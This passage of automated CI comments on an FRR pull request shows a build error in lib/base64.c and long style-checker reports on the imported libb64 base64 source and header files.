lib/base64.c: In function base64_decode_value:\n    lib/base64.c:127:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n    Makefile:9605: recipe for target 'lib/base64.lo' failed\n    make[1]: *** [lib/base64.lo] Error 1\n    isisd/isis_cli.c: In function isis_sr_local_block_label_range_magic:\n    isisd/isis_cli.c:1574:1: note: #pragma message: Use of the local-block command is deprecated\n     CPP_NOTICE(\"Use of the local-block command is deprecated\")\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3566/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n\n    <stdin>:286: new blank line at EOF.\n    +\n    warning: 1 line adds whitespace errors.\n    Report for base64.c | 77 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-5907/base64.c:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #10: FILE: /tmp/f1-5907/base64.c:10:\n    +void base64_init_encodestate(base64_encodestate* state_in)\n    \n    WARNING: line over 80 characters\n    #19: FILE: /tmp/f1-5907/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #19: FILE: /tmp/f1-5907/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: Missing a blank line after declarations\n    #20: FILE: /tmp/f1-5907/base64.c:20:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    +\tif (value_in > 63) return '=';\n    \n    ERROR: trailing statements should be on next line\n    #20: FILE: /tmp/f1-5907/base64.c:20:\n    +\tif (value_in > 63) return '=';\n    \n    WARNING: line over 80 characters\n    #24: FILE: /tmp/f1-5907/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-5907/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-5907/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-5907/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-5907/base64.c:26:\n    +\tconst char* plainchar = plaintext_in;\n    \n    ERROR: \"foo* const bar\" should be \"foo * const bar\"\n    #27: FILE: /tmp/f1-5907/base64.c:27:\n    +\tconst char* const plaintextend = plaintext_in + length_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-5907/base64.c:28:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #34: FILE: /tmp/f1-5907/base64.c:34:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #36: FILE: /tmp/f1-5907/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #36: FILE: /tmp/f1-5907/base64.c:36:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #39: FILE: /tmp/f1-5907/base64.c:39:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #51: FILE: /tmp/f1-5907/base64.c:51:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #63: FILE: /tmp/f1-5907/base64.c:63:\n    +\t\t\tif (plainchar == plaintextend)\n    +\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #76: FILE: /tmp/f1-5907/base64.c:76:\n    +\t\t\tif (state_in->stepcount == CHARS_PER_LINE/4)\n    +\t\t\t{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-5907/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #87: FILE: /tmp/f1-5907/base64.c:87:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #89: FILE: /tmp/f1-5907/base64.c:89:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-5907/base64.c:91:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #114: FILE: /tmp/f1-5907/base64.c:114:\n    +\t\t62,-1,-1,-1,63,52,53,54,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-5907/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-5907/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-5907/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-5907/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-5907/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #115: FILE: /tmp/f1-5907/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #115: FILE: /tmp/f1-5907/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                    ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #115: FILE: /tmp/f1-5907/base64.c:115:\n    +\t\t55,56,57,58,59,60,61,-1,\n     \t\t                     ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #116: FILE: /tmp/f1-5907/base64.c:116:\n    +\t\t-1,-1,-2,-1,-1,-1,0,1,\n     \t\t                   ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-5907/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-5907/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-5907/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-5907/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t          ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-5907/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #117: FILE: /tmp/f1-5907/base64.c:117:\n    +\t\t2, 3,4,5,6,7,8,9,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-5907/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-5907/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-5907/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-5907/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-5907/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-5907/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #118: FILE: /tmp/f1-5907/base64.c:118:\n    +\t\t10,11,12,13,14,15,16,17,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-5907/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-5907/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-5907/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-5907/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-5907/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-5907/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #119: FILE: /tmp/f1-5907/base64.c:119:\n    +\t\t18,19,20,21,22,23,24,25,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t  ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t   ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t     ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t      ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t        ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t         ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t           ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t            ^\n    \n    ERROR: space required after that ',' (ctx:VxO)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t              ^\n    \n    ERROR: space required before that '-' (ctx:OxV)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t               ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #120: FILE: /tmp/f1-5907/base64.c:120:\n    +\t\t-1,-1,-1,-1,-1,-1,26,27,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-5907/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-5907/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-5907/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-5907/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-5907/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-5907/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #121: FILE: /tmp/f1-5907/base64.c:121:\n    +\t\t28,29,30,31,32,33,34,35,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-5907/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-5907/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-5907/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-5907/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-5907/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-5907/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #122: FILE: /tmp/f1-5907/base64.c:122:\n    +\t\t36,37,38,39,40,41,42,43,\n     \t\t                    ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-5907/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t  ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-5907/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t     ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-5907/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t        ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-5907/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t           ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-5907/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t              ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-5907/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                 ^\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #123: FILE: /tmp/f1-5907/base64.c:123:\n    +\t\t44,45,46,47,48,49,50,51\n     \t\t                    ^\n    \n    WARNING: Missing a blank line after declarations\n    #126: FILE: /tmp/f1-5907/base64.c:126:\n    +\tstatic const char decoding_size = sizeof(decoding);\n    +\tvalue_in -= 43;\n    \n    ERROR: trailing statements should be on next line\n    #127: FILE: /tmp/f1-5907/base64.c:127:\n    +\tif (((int)value_in) < 0 || value_in >= decoding_size) return -1;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #131: FILE: /tmp/f1-5907/base64.c:131:\n    +void base64_init_decodestate(base64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-5907/base64.c:137:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #137: FILE: /tmp/f1-5907/base64.c:137:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #138: FILE: /tmp/f1-5907/base64.c:138:\n    +\t\t\tbase64_decodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #140: FILE: /tmp/f1-5907/base64.c:140:\n    +\tconst char* codechar = code_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #141: FILE: /tmp/f1-5907/base64.c:141:\n    +\tchar* plainchar = plaintext_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #146: FILE: /tmp/f1-5907/base64.c:146:\n    +\tswitch (state_in->step)\n    +\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #148: FILE: /tmp/f1-5907/base64.c:148:\n    +\t\twhile (1)\n    +\t\t{\n    \n    WARNING: suspect code indent for conditional statements (16, 16)\n    #148: FILE: /tmp/f1-5907/base64.c:148:\n    +\t\twhile (1)\n    +\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #152: FILE: /tmp/f1-5907/base64.c:152:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #164: FILE: /tmp/f1-5907/base64.c:164:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #177: FILE: /tmp/f1-5907/base64.c:177:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    \n    ERROR: that open brace { should be on the previous line\n    #190: FILE: /tmp/f1-5907/base64.c:190:\n    +\t\t\t\tif (codechar == code_in+length_in)\n    +\t\t\t\t{\n    Report for base64.h | 85 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-5907/base64.h:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    WARNING: do not add new typedefs\n    #9: FILE: /tmp/f1-5907/base64.h:9:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #10: FILE: /tmp/f1-5907/base64.h:10:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #14: FILE: /tmp/f1-5907/base64.h:14:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #15: FILE: /tmp/f1-5907/base64.h:15:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #21: FILE: /tmp/f1-5907/base64.h:21:\n    +void base64_init_encodestate(base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-5907/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #25: FILE: /tmp/f1-5907/base64.h:25:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-5907/base64.h:26:\n    +\t\t\tbase64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-5907/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-5907/base64.h:28:\n    +int base64_encode_blockend(char* code_out, base64_encodestate* state_in);\n    \n    WARNING: do not add new typedefs\n    #31: FILE: /tmp/f1-5907/base64.h:31:\n    +typedef enum\n    \n    ERROR: open brace '{' following enum go on the same line\n    #32: FILE: /tmp/f1-5907/base64.h:32:\n    +typedef enum\n    +{\n    \n    WARNING: do not add new typedefs\n    #36: FILE: /tmp/f1-5907/base64.h:36:\n    +typedef struct\n    \n    ERROR: open brace '{' following struct go on the same line\n    #37: FILE: /tmp/f1-5907/base64.h:37:\n    +typedef struct\n    +{\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #42: FILE: /tmp/f1-5907/base64.h:42:\n    +void base64_init_decodestate(base64_decodestate* state_in);\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-5907/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #46: FILE: /tmp/f1-5907/base64.h:46:\n    +int base64_decode_block(const char* code_in, int length_in, char* plaintext_out,\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #47: FILE: /tmp/f1-5907/base64.h:47:\n    +\t\t\tbase64_decodestate* state_in);\n    \n    WARNING: C99 // comments do not match recommendation\n    #49: FILE: /tmp/f1-5907/base64.h:49:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 8 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-5907/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #691: FILE: /tmp/f1-5907/yang_wrappers.c:691:\n    < WARNING: Missing a blank line after declarations\n    < #696: FILE: /tmp/f1-5907/yang_wrappers.c:696:\n    < WARNING: Missing a blank line after declarations\n    < #709: FILE: /tmp/f1-5907/yang_wrappers.c:709:\n\n</details>\n\n</details> <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3567/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    <stdin>:286: new blank line at EOF.\n    +\n    warning: 1 line adds whitespace errors.\n    Report for base64.c | 77 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-10645/base64.c:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #10: FILE: /tmp/f1-10645/base64.c:10:\n    +void base64_init_encodestate(base64_encodestate* state_in)\n    \n    WARNING: line over 80 characters\n    #19: FILE: /tmp/f1-10645/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #19: FILE: /tmp/f1-10645/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: Missing a blank line after declarations\n    #20: FILE: /tmp/f1-10645/base64.c:20:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    +\tif (value_in > 63) return '=';\n    \n    ERROR: trailing statements should be on next line\n    #20: FILE: /tmp/f1-10645/base64.c:20:\n    +\tif (value_in > 63) return '=';\n    \n    WARNING: line over 80 characters\n    #24: FILE: /tmp/f1-10645/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-10645/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-10645/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #24: FILE: /tmp/f1-10645/base64.c:24:\n    +int base64_encode_block(const char* plaintext_in, int length_in, char* code_out, base64_encodestate* state_in)\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #26: FILE: /tmp/f1-10645/base64.c:26:\n    +\tconst char* plainchar = plaintext_in;\n    \n    ERROR: \"foo* const bar\" should be \"foo * const bar\"\n    #27: FILE: /tmp/f1-10645/base64.c:27:\n    +\tconst char* const plaintextend = plaintext_in + length_in;\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #28: FILE: /tmp/f1-10645/base64.c:28:\n    +\tchar* codechar = code_out;\n    \n    ERROR: that open brace { should be on the previous line\n    #34: FILE: 